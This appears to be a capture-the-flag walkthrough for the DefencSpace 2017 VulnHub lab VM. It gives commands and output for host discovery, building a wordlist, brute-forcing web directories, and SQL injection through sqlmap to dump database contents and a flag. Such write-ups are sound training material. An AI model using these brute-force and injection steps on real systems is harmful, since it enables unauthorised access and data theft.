# [VMHacking] DefencSpace - CTF 2017

[Hackin Articles link](http://www.hackingarticles.in/hack-the-defense-space-vm-ctf-challengehack-defense-vm-ctf-challenge/)

[VM Download](https://www.vulnhub.com/entry/defence-space-ctf-2017,179/)



</br>



## Discover the IP of the target on your

```sh
$ netdiscover
 Currently scanning: 172.27.9.0/16   |   Screen View: Unique Hosts

 14 Captured ARP Req/Rep packets, from 11 hosts.   Total size: 840
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.0.2     54:64:d9:db:b4:21      1      60  Sagemcom Broadband SAS
 192.168.0.25    ac:bc:32:7a:2e:93      3     180  Apple, Inc.
 192.168.0.1     54:64:d9:49:b7:ec      2     120  Sagemcom Broadband SAS
 192.168.0.3     00:03:81:b3:6f:56      1      60  Ingenico International
 192.168.0.10    54:64:d9:db:b4:22      1      60  Sagemcom Broadband SAS
 192.168.0.26    f8:16:54:14:1b:80      1      60  Intel Corporate
 192.168.0.32    f8:16:54:14:1b:80      1      60  Intel Corporate
```



</br>



## Multiple secret decoder

- [MD5 Decrypter](https://hashkiller.co.uk/md5-decrypter.aspx)
- [Hex to text](http://www.unit-conversion.info/texttools/hexadecimal/)
- [Hash crack](https://crackstation.net/)




</br>



## Generate dict of number combinaison prefix by *Unit*

```sh
# crunch <min-len> <max-len> <symbol used> -o output.txt
$ crunch 3 3 309 -o dict.txt
333
339
330
393
399
...
```
```sh
# Script to add Unit before number
#!/bin/bash

touch out.txt

while read line
do
    line="Unit"$line
    echo $line >> out.txt
done < dict.txt
```



</br>



## Bruteforce web directory with our dictionary	

```sh
$ dirb http://192.168.0.32 /tmp/pentest/dict.txt
```



</br>



## SQL injection

- Intercept login input field request

```
POST /Unit990/model/authMember.php HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Referer: http://192.168.0.32/Unit990/admin.php
Cookie: PHPSESSID=opogpiblviu4hkkulefaek2it0
Connection: close
Upgrade-Insecure-Requests: 1

admin_code=test&admin=
```

- Write the request in a file and load with sqlmap

```sh
$ sqlmap --level 5 --risk 3 -l burp.log --sql-shell

# Awnser yes to every question

sql-shell> select * from *
...
retrived: silex
...

sql-shell> select * from silex.admin # A few guessing for 'admin'
...
[*] ZmxhZyA2IHtOaWdhaXJmb3JjZWNsb3VkfQ==,

```



